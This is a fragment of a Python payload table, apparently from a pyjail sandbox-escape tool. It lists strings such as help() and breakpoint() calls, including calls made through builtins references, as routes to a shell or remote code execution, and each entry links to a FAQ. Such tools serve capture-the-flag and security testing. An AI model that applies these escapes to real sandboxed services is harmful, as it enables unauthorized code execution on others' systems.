RCE_data = {
    ...
    "directly_getshell": [
        ["help()", "help", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce"],
        ["help", "help", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce"],
        ["breakpoint()", "breakpoint", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce"],
    ...
    "builtins2RCEinput": [
        ["BUILTINS_SET['help']()", "BUILTINS_SET", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce"],
        ["MODULE_BUILTINS.help()", "MODULE_BUILTINS", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#help-rce"],
        ["BUILTINS_SET['breakpoint']()", "BUILTINS_SET", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce"],
        ["MODULE_BUILTINS.breakpoint()", "MODULE_BUILTINS", "if you don't know how to use this payload, check: https://typhon.lamentxu.top/zh-cn/latest/FAQ.html#breakpoint-rce"],
